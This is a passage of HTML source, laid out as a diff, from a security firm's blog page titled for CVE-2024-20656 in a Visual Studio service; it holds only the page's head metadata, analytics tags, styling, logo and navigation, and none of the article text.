@@ -1,0 +1,738 @@
+<html lang="en-GB" class=" js flexbox flexboxlegacy canvas canvastext postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg"><!--<![endif]--><head>
+
+<script type="text/javascript" async="" src="https://www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-B07BRS7JX2&amp;l=dataLayer&amp;cx=c"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/releases/TqxSU0dsOd2Q9IbI7CpFnJLD/recaptcha__pl.js" crossorigin="anonymous" integrity="sha384-EtuwsrUt4o3rjKbOIgbMlrdETicyC7YJiOMF4S2kRPR2c6EcUDPrB1OFkiSEO3IC"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=UA-67981177-1" type="text/javascript"></script>
+<script type="text/javascript">
+	  		window.dataLayer = window.dataLayer || [];
+	  		function gtag(){dataLayer.push(arguments);}
+	  		gtag('js', new Date());
+
+	  		gtag('config', 'UA-67981177-1');
+		</script>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<title>CVE-2024-20656 - Local Privilege Escalation in the VSStandardCollectorService150 Service - MDSec</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="apple-touch-icon" sizes="57x57" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/img/favicons/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<link rel="stylesheet" href="https://use.typekit.net/icv6vdt.css">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+
+<link rel="canonical" href="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/">
+<meta property="og:locale" content="en_GB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2024-20656 - Local Privilege Escalation in the VSStandardCollectorService150 Service - MDSec">
+<meta property="og:description" content="Overview Visual Studio is a complex and powerful IDE developed by Microsoft and comes with a lot of features that can be interesting from a red team perspective. During this...">
+<meta property="og:url" content="https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/">
+<meta property="og:site_name" content="MDSec">
+<meta property="article:published_time" content="2024-01-12T14:33:01+00:00">
+<meta property="article:modified_time" content="2024-01-12T14:51:43+00:00">
+<meta property="og:image" content="https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg">
+<meta property="og:image:width" content="1000">
+<meta property="og:image:height" content="667">
+<meta property="og:image:type" content="image/jpeg">
+<meta name="author" content="Admin">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@mdseclabs">
+<meta name="twitter:site" content="@mdseclabs">
+<meta name="twitter:label1" content="Written by">
+<meta name="twitter:data1" content="Admin">
+<meta name="twitter:label2" content="Estimated reading time">
+<meta name="twitter:data2" content="10 minutes">
+<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#article","isPartOf":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/"},"author":{"name":"Admin","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3"},"headline":"CVE-2024-20656 &#8211; Local Privilege Escalation in the VSStandardCollectorService150 Service","datePublished":"2024-01-12T14:33:01+00:00","dateModified":"2024-01-12T14:51:43+00:00","mainEntityOfPage":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/"},"wordCount":1550,"publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"image":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","articleSection":["ActiveBreach","Adversary Simulation","All","Exploitation","Penetration testing","Red Team"],"inLanguage":"en-GB"},{"@type":"WebPage","@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/","url":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/","name":"CVE-2024-20656 - Local Privilege Escalation in the VSStandardCollectorService150 Service - MDSec","isPartOf":{"@id":"https://www.mdsec.co.uk/#website"},"primaryImageOfPage":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#primaryimage"},"image":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#primaryimage"},"thumbnailUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","datePublished":"2024-01-12T14:33:01+00:00","dateModified":"2024-01-12T14:51:43+00:00","breadcrumb":{"@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#breadcrumb"},"inLanguage":"en-GB","potentialAction":[{"@type":"ReadAction","target":["https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/"]}]},{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#primaryimage","url":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2019/11/tim-van-der-kuip-CPs2X8JYmS8-unsplash.jpg","width":1000,"height":667},{"@type":"BreadcrumbList","@id":"https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://www.mdsec.co.uk/"},{"@type":"ListItem","position":2,"name":"CVE-2024-20656 &#8211; Local Privilege Escalation in the VSStandardCollectorService150 Service"}]},{"@type":"WebSite","@id":"https://www.mdsec.co.uk/#website","url":"https://www.mdsec.co.uk/","name":"MDSec","description":"Unrivalled Security Consulting &amp; Training","publisher":{"@id":"https://www.mdsec.co.uk/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://www.mdsec.co.uk/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-GB"},{"@type":"Organization","@id":"https://www.mdsec.co.uk/#organization","name":"MDSec","url":"https://www.mdsec.co.uk/","logo":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/logo/image/","url":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","contentUrl":"https://www.mdsec.co.uk/wp-content/uploads/2020/08/MDSec-Logo-Blue.png","width":1500,"height":1000,"caption":"MDSec"},"image":{"@id":"https://www.mdsec.co.uk/#/schema/logo/image/"},"sameAs":["https://x.com/mdseclabs"]},{"@type":"Person","@id":"https://www.mdsec.co.uk/#/schema/person/17b494d22ae189270c1e0e41b25fcae3","name":"Admin","image":{"@type":"ImageObject","inLanguage":"en-GB","@id":"https://www.mdsec.co.uk/#/schema/person/image/","url":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","contentUrl":"https://secure.gravatar.com/avatar/ea6be35ff31bf7eba02c999d1d41eff2?s=96&d=wp_user_avatar&r=g","caption":"Admin"},"sameAs":["https://x.com/mdseclabs"],"url":"https://www.mdsec.co.uk/author/dominic/"}]}</script>
+
+<link rel="stylesheet" id="wp-block-library-css" href="https://www.mdsec.co.uk/wp-includes/css/dist/block-library/style.min.css?ver=68eecf8b42fd190e040ecba89f2d6c70" type="text/css" media="all">
+<style id="classic-theme-styles-inline-css" type="text/css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css" type="text/css">
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="taxonomy-image-plugin-public-css" href="https://www.mdsec.co.uk/wp-content/plugins/taxonomy-images/css/style.css?ver=0.9.6" type="text/css" media="screen">
+<link rel="stylesheet" id="style-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/style.css?ver=1.1.5" type="text/css" media="all">
+<link rel="stylesheet" id="prism-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/solarized_dark.css?ver=1" type="text/css" media="all">
+<link rel="stylesheet" id="flickity-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/flickity.min.css?ver=1" type="text/css" media="all">
+<link rel="stylesheet" id="hamburger-css-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/hamburgers.css?ver=1" type="text/css" media="all">
+<link rel="stylesheet" id="font-awesome-css" href="https://www.mdsec.co.uk/wp-content/themes/mdsec/css/font-awesome.min.css?ver=68eecf8b42fd190e040ecba89f2d6c70" type="text/css" media="all">
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/html5shiv.js?ver=3.7.3" id="html5js-js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/respond.js?ver=1.3.1" id="respond-script-js"></script>
+<![endif]-->
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://www.mdsec.co.uk/wp-content/themes/mdsec/js/selectivizr-min.js?ver=1.0.2" id="selectivizr-script-js"></script>
+<![endif]-->
+<link rel="https://api.w.org/" href="https://www.mdsec.co.uk/wp-json/"><link rel="alternate" type="application/json" href="https://www.mdsec.co.uk/wp-json/wp/v2/posts/3346"><link rel="shortlink" href="https://www.mdsec.co.uk/?p=3346">
+<link rel="alternate" type="application/json+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2024%2F01%2Fcve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://www.mdsec.co.uk/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.mdsec.co.uk%2F2024%2F01%2Fcve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service%2F&amp;format=xml">
+<style type="text/css" id="wp-custom-css">
+			.insights-content p
+{
+	font-family: titling-gothic-fb,sans-serif;
+	color: #777a85;
+}
+
+.insights-content ul li
+{
+	font-family: titling-gothic-fb,sans-serif;
+color: #777a85;
+}
+
+
+.insights-content h2
+{
+	font-family: fabrikat_mono_regular;
+	font-weight: bold;
+}
+
+.insights-content figure
+{
+	justify-content: center;
+}
+
+.insights-content .wp-block-code code {
+    max-width: 1000px;
+    display: block;
+    overflow-x: auto;
+    color: #839496;
+    margin: 0 auto;
+    -webkit-text-size-adjust: none;
+    font-size: 1.3rem;
+    line-height: 20px;
+		padding: 2px 0px;
+}		</style>
+</head>
+<body class="post-template-default single single-post postid-3346 single-format-standard">
+<!--[if lt IE 7]>
+        <div class="browse-happy">
+        	 <a href="https://www.mdsec.co.uk">
+				<div id="logo">Logo</div>
+			</a>
+        	<p>You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        </div>    	
+    <![endif]-->
+
+<div class="site-wrapper">
+
+<header class="clearfix">
+<div class="logo">
+<a href="https://www.mdsec.co.uk" title="MDSec">
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 188.3 50" style="enable-background:new 0 0 188.3 50;" xml:space="preserve">
+<g>
+<g>
+<path class="st0" d="M71.3,49.7V33.1l-7.7,16.5h-5.9l-7.5-16.5v16.5h-5.7V24.9h7.7l8.5,18.9l8.7-18.9H77v24.8H71.3z"></path>
+<path class="st0" d="M95.8,49.7H80V24.9h15.6c5.7,0,9,1.6,10.6,4.4c1.2,1.8,1.6,4,1.6,7.6c0,3.9-0.4,6.1-1.5,8
+							C104.7,47.9,101.4,49.7,95.8,49.7z M101.9,37c0-2.1-0.3-3.9-1-4.8c-1.1-1.7-2.9-2.5-6.2-2.5H86v15h8.6c3.4,0,5.3-0.8,6.4-2.4
+							C101.7,41.3,101.9,39.3,101.9,37z"></path>
+<path class="st0" d="M125.2,50c-8.7,0-13.1-2.8-13.4-7.9h2.8c0.2,3.7,4.1,5.4,10.6,5.4c6.9,0,9.3-1.8,9.3-4.5c0-2.9-2.1-4.1-9.9-5
+							c-5.9-0.7-12.3-1.4-12.3-6.8c0-3.6,3.1-6.7,11.8-6.7c8.5,0,11.9,3.5,12.7,7.3h-2.9c-0.7-2.9-3.5-4.8-9.9-4.8
+							c-6.3,0-8.9,1.7-8.9,4.1c0,3.4,4.9,3.9,10.1,4.4c7.5,0.8,12.1,2.1,12.1,7.2C137.3,47.2,133.8,50,125.2,50z"></path>
+<path class="st0" d="M151.9,50c-7.3,0-11.6-2.8-11.6-9.2c0-5.8,4.3-8.9,11.5-8.9c8.1,0,11.7,4,11.4,10h-20.3c0.1,3.8,3.5,6,9.2,6
+							c5.9,0,7.9-2.2,8.3-3.5h2.6C162.2,47.2,159.3,50,151.9,50z M151.7,34c-5.8,0-8.9,2.3-8.9,5.8h17.7C160.5,36.4,157.9,34,151.7,34z"></path>
+<path class="st0" d="M185.7,38.5c-0.1-0.8-0.3-1.4-0.9-2c-1.2-1.4-3.7-2.4-7.4-2.4c-3.8,0-6.4,0.9-7.9,2.7c-0.9,1-1.2,2.4-1.2,4.2
+							c0,1.9,0.4,3.3,1.3,4.3c1.4,1.7,4.1,2.5,7.9,2.5c3.7,0,5.9-0.7,7.2-1.9c0.6-0.6,1-1.5,1.1-2.2h2.6c-0.2,1.3-0.7,2.6-1.6,3.5
+							C185,49,182,50,177.3,50c-4.8,0-8.1-1.1-9.9-3.3c-1.2-1.4-1.8-3.3-1.8-5.8c0-2.3,0.6-4.2,1.7-5.6c1.9-2.2,5.3-3.5,9.9-3.5
+							c5.3,0,8.4,1.5,9.8,3.5c0.8,1,1,2.1,1.1,3.2H185.7z"></path>
+</g>
+<path class="st0" d="M31,44.1H2c-1.1,0-2,0.9-2,2v3.5h32.9V46C32.9,45,32,44.1,31,44.1z"></path>
+<path class="st0" d="M19.5,19.2l0.3,0c0.9-0.1,1.6-0.4,2.3-0.9l0,0l3,2.5c0.3,0.3,0.7,0.5,1.1,0.6c1.2,0.3,2.4-0.2,3-1.2l1.8-1.9
+						c0.3-0.3,0.3-0.7,0.1-1l-5.4-7.5C25.2,9.3,25,8.6,24.8,8c-0.2-1.1-0.9-2-1.9-2.5l-3.7-1.9l2.5-2.5l0,0c0,0-0.1-0.1-0.1-0.1
+						c-0.6-0.6-1.4-1-2.3-1c-0.6,0-1.1,0.1-1.6,0.4l0,0l-7.7,3.3l0,0c-4.7,2-8,6.7-8,12.1v2L5.9,14v2.7L2,20.5v2.7l3.8-3.8v2.7L2,25.9
+						v2.7l3.8-3.8v2.7L2,31.4v1.7h3.9L2,37V42H31v-0.7c0-7.7-3.2-12.2-6.5-14.4c-2.4-1.6-8.1-3.3-8.1-8.4c0.8,0.5,1.8,0.8,2.8,0.8
+						C19.3,19.2,19.4,19.2,19.5,19.2z"></path>
+</g>
+</svg>
+</a>
+</div>
+
+<nav role="navigation" class="main-navigation" id="main-navigation">
+<ul id="menu-main-navigation" class="clearfix"><li id="menu-item-367" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-367"><a href="#">Our Services</a></li>
+<li id="menu-item-368" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-368"><a href="#">Knowledge Centre</a></li>
+<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="https://www.mdsec.co.uk/about/">About</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-20"><a href="https://www.mdsec.co.uk/contact/">Contact</a></li>
+</ul> </nav>
+
+
+<nav role="navigation" class="mobile-navigation" id="mobile-navigation">
+<ul id="menu-mobile-navigation" class="clearfix"><li id="menu-item-373" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-373"><a href="#">Our Services</a>
+<ul class="sub-menu">
+<li id="menu-item-374" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-374"><a href="https://www.mdsec.co.uk/our-services/adversary-simulation/">Adversary Simulation</a></li>
+<li id="menu-item-375" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-375"><a href="https://www.mdsec.co.uk/our-services/application-security/">Application Security</a></li>
+<li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-376"><a href="https://www.mdsec.co.uk/our-services/penetration-testing/">Penetration Testing</a></li>
+<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-377"><a href="https://www.mdsec.co.uk/our-services/response/">Response</a></li>
+</ul>
+</li>
+<li id="menu-item-378" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-378"><a href="#">Knowledge Centre</a>
+<ul class="sub-menu">
+<li id="menu-item-379" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-379"><a href="https://www.mdsec.co.uk/knowledge-centre/insights/">Insights</a></li>
+<li id="menu-item-380" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-380"><a href="https://www.mdsec.co.uk/knowledge-centre/research/">Research</a></li>
+<li id="menu-item-381" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-381"><a href="https://www.mdsec.co.uk/knowledge-centre/training/">Training</a></li>
+</ul>
+</li>
+<li id="menu-item-371" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-371"><a href="https://www.mdsec.co.uk/about/">About</a></li>
